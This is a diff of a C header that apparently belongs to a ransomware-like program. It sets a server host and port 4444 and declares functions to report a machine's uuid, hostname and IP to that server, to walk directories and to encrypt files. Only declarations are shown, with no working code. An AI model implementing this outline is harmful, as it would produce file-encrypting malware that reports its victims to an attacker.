@@ -1,19 +1,20 @@
 #ifndef FUNCS_H_INCLUDED
-#define FUNCS_H_INCLUDED
+	#define FUNCS_H_INCLUDED
 
-#define myhost "192.168.0.103"
-#define myport 4444
+	#define myhost "127.0.0.1"
+	#define myport 4444
 
-void connectserver(char *uuid, char *hostname);
+	//send information to server
+	void connectserver(char *uuid, char *hostname);
 
-void encryptfile(char *encryptfile);
+	void encryptfile(char *encryptfile);
 
-void WhatIsDir(char *name_dir);
+	void WhatIsDir(char *name_dir);
 
-char *getuuid();
+	char *getuuid(void);
 
-char *getpcname();
+	char *getpcname(void);
 
-char *getip();
+	char *getip(void);
 
 #endif
